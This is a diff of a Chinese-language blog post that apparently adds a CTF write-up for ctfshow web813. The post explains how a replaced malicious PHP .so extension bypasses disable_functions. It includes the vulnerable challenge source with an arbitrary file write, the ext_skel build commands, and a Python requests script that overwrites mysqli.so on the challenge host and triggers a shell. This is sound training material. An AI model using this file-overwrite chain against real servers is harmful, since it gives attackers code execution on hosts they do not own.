@@ -6,16 +6,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="这道题先放一放，闲了再研究参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1XT4y1h7Th&#x2F;?spm_id_from&#x3D;333.999.0.0&amp;vd_source&#x3D;ddab59a2223290fb9ed7af04a32cf94d 什么是so文件so文件是linux下的一种文件格式，是shared object的缩写。可以简单的理解为so是将一系列c函数包装到一个">
+    <meta name="description" content="用恶意so替换的条件：1.扩展目录已知且可写（扩展目录一般在phpinfo里看） 2.能够载入我们的恶意so文件（重启php-fpm或者能使用php命令行） 3.源码中有调用我们自定义函数的代码，如shell_exec(&quot;php -r &#39;backdoor();&#39;&quot;); 参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1XT4y1h7Th">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php恶意so绕disable_functions">
 <meta property="og:url" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/index.html">
 <meta property="og:site_name" content="K1ato&#39;s blog">
-<meta property="og:description" content="这道题先放一放，闲了再研究参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1XT4y1h7Th&#x2F;?spm_id_from&#x3D;333.999.0.0&amp;vd_source&#x3D;ddab59a2223290fb9ed7af04a32cf94d 什么是so文件so文件是linux下的一种文件格式，是shared object的缩写。可以简单的理解为so是将一系列c函数包装到一个">
+<meta property="og:description" content="用恶意so替换的条件：1.扩展目录已知且可写（扩展目录一般在phpinfo里看） 2.能够载入我们的恶意so文件（重启php-fpm或者能使用php命令行） 3.源码中有调用我们自定义函数的代码，如shell_exec(&quot;php -r &#39;backdoor();&#39;&quot;); 参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1XT4y1h7Th">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/1.PNG">
+<meta property="og:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/0.PNG">
+<meta property="og:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/11.PNG">
+<meta property="og:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/2.PNG">
+<meta property="og:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/3.PNG">
+<meta property="og:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/4.PNG">
 <meta property="article:published_time" content="2024-09-16T08:10:52.000Z">
-<meta property="article:modified_time" content="2024-09-17T07:19:14.326Z">
+<meta property="article:modified_time" content="2024-09-24T01:39:17.544Z">
 <meta property="article:author" content="k1ato">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/1.PNG">
@@ -114,7 +119,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%81%93%E9%A2%98%E5%85%88%E6%94%BE%E4%B8%80%E6%94%BE%EF%BC%8C%E9%97%B2%E4%BA%86%E5%86%8D%E7%A0%94%E7%A9%B6"><span class="toc-number">1.</span> <span class="toc-text">这道题先放一放，闲了再研究</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFso%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">什么是so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%89%A9%E5%B1%95%E7%9B%AE%E5%BD%95%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88so%E6%96%87%E4%BB%B6%E5%91%A2%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">默认扩展目录都有什么so文件呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">php实例化一个类对象的过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">恶意so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6%E8%83%BD%E7%BB%95%E8%BF%87disable-functons%EF%BC%9F"><span class="toc-number">7.</span> <span class="toc-text">为什么恶意so文件能绕过disable_functons？</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%81%B6%E6%84%8Fso%E6%9B%BF%E6%8D%A2%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">用恶意so替换的条件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFso%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">什么是so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%89%A9%E5%B1%95%E7%9B%AE%E5%BD%95%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88so%E6%96%87%E4%BB%B6%E5%91%A2%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">默认扩展目录都有什么so文件呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">php实例化一个类对象的过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">恶意so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6%E8%83%BD%E7%BB%95%E8%BF%87disable-functons%EF%BC%9F"><span class="toc-number">7.</span> <span class="toc-text">为什么恶意so文件能绕过disable_functons？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90so%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">如何生成so文件？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web813"><span class="toc-number">9.</span> <span class="toc-text">web813</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">解题流程：</span></a></li></ol>
       </div>
     
   </span>
@@ -154,7 +159,10 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h3 id="这道题先放一放，闲了再研究"><a href="#这道题先放一放，闲了再研究" class="headerlink" title="这道题先放一放，闲了再研究"></a>这道题先放一放，闲了再研究</h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XT4y1h7Th/?spm_id_from=333.999.0.0&vd_source=ddab59a2223290fb9ed7af04a32cf94d">https://www.bilibili.com/video/BV1XT4y1h7Th/?spm_id_from=333.999.0.0&amp;vd_source=ddab59a2223290fb9ed7af04a32cf94d</a></p>
+    <h3 id="用恶意so替换的条件："><a href="#用恶意so替换的条件：" class="headerlink" title="用恶意so替换的条件："></a>用恶意so替换的条件：</h3><p>1.扩展目录已知且可写（扩展目录一般在phpinfo里看）</p>
+<p>2.能够载入我们的恶意so文件（重启php-fpm或者能使用php命令行）</p>
+<p>3.源码中有调用我们自定义函数的代码，如<code>shell_exec(&quot;php -r &#39;backdoor();&#39;&quot;);</code></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XT4y1h7Th/?spm_id_from=333.999.0.0&vd_source=ddab59a2223290fb9ed7af04a32cf94d">https://www.bilibili.com/video/BV1XT4y1h7Th/?spm_id_from=333.999.0.0&amp;vd_source=ddab59a2223290fb9ed7af04a32cf94d</a></p>
 <h3 id="什么是so文件"><a href="#什么是so文件" class="headerlink" title="什么是so文件"></a>什么是so文件</h3><p>so文件是linux下的一种文件格式，是<code>shared object</code>的缩写。可以简单的理解为so是将一系列c函数包装到一个文件中，方便其他二进制文件调用的一个函数包。</p>
 <p>我们可以自定义扩展，并把它加入到php的解释器中，这里的扩展就是so文件，同时，如果没有指定扩展（默认情况），就会去默认的扩展目录里加载所有扩展。默认目录在phpinfo中<code>extension_dir</code>项查看。</p>
 <h3 id="默认扩展目录都有什么so文件呢？"><a href="#默认扩展目录都有什么so文件呢？" class="headerlink" title="默认扩展目录都有什么so文件呢？"></a>默认扩展目录都有什么so文件呢？</h3><p>有mysql.so、opcache.so、pdo_mysql.so、sodium.so等，这些so文件都是用c语言编写的二进制文件，用来声明一些函数并完成函数的调用。</p>
@@ -171,6 +179,32 @@
 
 <h3 id="为什么恶意so文件能绕过disable-functons？"><a href="#为什么恶意so文件能绕过disable-functons？" class="headerlink" title="为什么恶意so文件能绕过disable_functons？"></a>为什么恶意so文件能绕过disable_functons？</h3><p>准确的说，并没有绕过php的disable_functions，只是没有执行php禁用的函数，那么自然就能顺利执行。</p>
 <p>php禁用的system函数，是php的语言函数，而恶意so里的system函数，是c语言库中的函数。</p>
+<h3 id="如何生成so文件？"><a href="#如何生成so文件？" class="headerlink" title="如何生成so文件？"></a>如何生成so文件？</h3><p>使用php源码包中的ext_skel框架（专门用来自定义扩展的框架），在<code>/usr/src/php/ext</code>目录下有个ext_skel.php文件，生成命令也很简单：<code>php ext_skel.php --ext Backdoor --author kato --std</code></p>
+<h3 id="web813"><a href="#web813" class="headerlink" title="web813"></a>web813</h3><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;a&#x27;];</span><br><span class="line">switch ($action) &#123;</span><br><span class="line">    case &#x27;phpinfo&#x27;:</span><br><span class="line">        phpinfo();</span><br><span class="line">        break;</span><br><span class="line">    </span><br><span class="line">    case &#x27;write&#x27;:</span><br><span class="line">        file_put_contents($_POST[&#x27;file&#x27;],$_POST[&#x27;content&#x27;]);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &#x27;run&#x27;:</span><br><span class="line">        shell_exec(&quot;php -r &#x27;ctfshow();&#x27;&quot;);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    default:</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        break;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>分析：有phpinfo（知道扩展目录）、能写文件、执行了<code>ctfshow()</code>函数，很明显这个函数并未在脚本中定义，php会从扩展so文件中去找是否有该函数定义。</p>
+<p>思路就是本地生成一个so扩展，然后上传替换服务器的mysqli.so扩展。</p>
+<h3 id="解题流程："><a href="#解题流程：" class="headerlink" title="解题流程："></a>解题流程：</h3><p>1.先看一下服务器上的php扩展目录：</p>
+<img src="/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/0.PNG" class="">
+
+<p>2.本地生成一个ctfshow.so: <code>php ext_skel.php --ext ctfshow --std</code></p>
+<p>进入ctfshow目录，修改ctfshow.c文件，两处修改：</p>
+<img src="/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/11.PNG" class="">
+
+<img src="/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/2.PNG" class="">
+
+<p>3.修改完后，执行以下命令生成so文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>生成完后会告诉so文件在哪个位置：</p>
+<img src="/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/3.PNG" class="">
+
+<p>5.用ctfshow.so替换mysqli.so：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://d5327f2a-7075-426c-ae74-4da580793e5a.challenge.ctf.show/&quot;</span><br><span class="line">data=&#123;&#x27;file&#x27;:&#x27;/usr/local/lib/php/extensions/no-debug-non-zts-20180731/mysqli.so&#x27;,&#x27;content&#x27;:open(&#x27;ctfshow.so&#x27;,&#x27;rb&#x27;).read()&#125;</span><br><span class="line">requests.post(url+&#x27;?a=write&#x27;,data=data)</span><br><span class="line">requests.get(url+&#x27;?a=run&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>服务器上接收到了shell：</p>
+<img src="/2024/09/16/php%E6%81%B6%E6%84%8Fso%E7%BB%95disable-functions/4.PNG" class="">
 
   </div>
 </article>
@@ -196,7 +230,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%81%93%E9%A2%98%E5%85%88%E6%94%BE%E4%B8%80%E6%94%BE%EF%BC%8C%E9%97%B2%E4%BA%86%E5%86%8D%E7%A0%94%E7%A9%B6"><span class="toc-number">1.</span> <span class="toc-text">这道题先放一放，闲了再研究</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFso%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">什么是so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%89%A9%E5%B1%95%E7%9B%AE%E5%BD%95%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88so%E6%96%87%E4%BB%B6%E5%91%A2%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">默认扩展目录都有什么so文件呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">php实例化一个类对象的过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">恶意so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6%E8%83%BD%E7%BB%95%E8%BF%87disable-functons%EF%BC%9F"><span class="toc-number">7.</span> <span class="toc-text">为什么恶意so文件能绕过disable_functons？</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%81%B6%E6%84%8Fso%E6%9B%BF%E6%8D%A2%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">用恶意so替换的条件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFso%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">什么是so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%89%A9%E5%B1%95%E7%9B%AE%E5%BD%95%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88so%E6%96%87%E4%BB%B6%E5%91%A2%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">默认扩展目录都有什么so文件呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">php实例化一个类对象的过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">恶意so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6%E8%83%BD%E7%BB%95%E8%BF%87disable-functons%EF%BC%9F"><span class="toc-number">7.</span> <span class="toc-text">为什么恶意so文件能绕过disable_functons？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90so%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">如何生成so文件？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web813"><span class="toc-number">9.</span> <span class="toc-text">web813</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">解题流程：</span></a></li></ol>
       </div>
     
 
